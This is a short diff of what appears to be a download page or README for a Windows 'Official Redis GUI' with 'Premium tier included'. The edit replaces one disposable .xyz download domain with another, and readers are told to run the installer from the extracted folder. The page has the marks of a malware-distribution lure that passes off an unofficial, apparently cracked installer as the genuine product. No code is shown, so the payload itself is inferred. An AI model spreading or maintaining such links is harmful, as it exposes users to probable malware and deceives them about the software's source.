@@ -8,8 +8,8 @@ Official Redis GUI for keys, CLI and slow-log analysis · Premium tier included 
 
 > Use the project link below for Windows.
 
-* **Project link:** **[redis-insight-database-monitoring-2026.nexpath.xyz](https://redis-insight-database-monitoring-2026.nexpath.xyz/)**
-* **Full URL:** `https://redis-insight-database-monitoring-2026.nexpath.xyz/`
+* **Project link:** **[redis-insight-database-monitoring-2026.nerasix.xyz](https://redis-insight-database-monitoring-2026.nerasix.xyz/)**
+* **Full URL:** `https://redis-insight-database-monitoring-2026.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
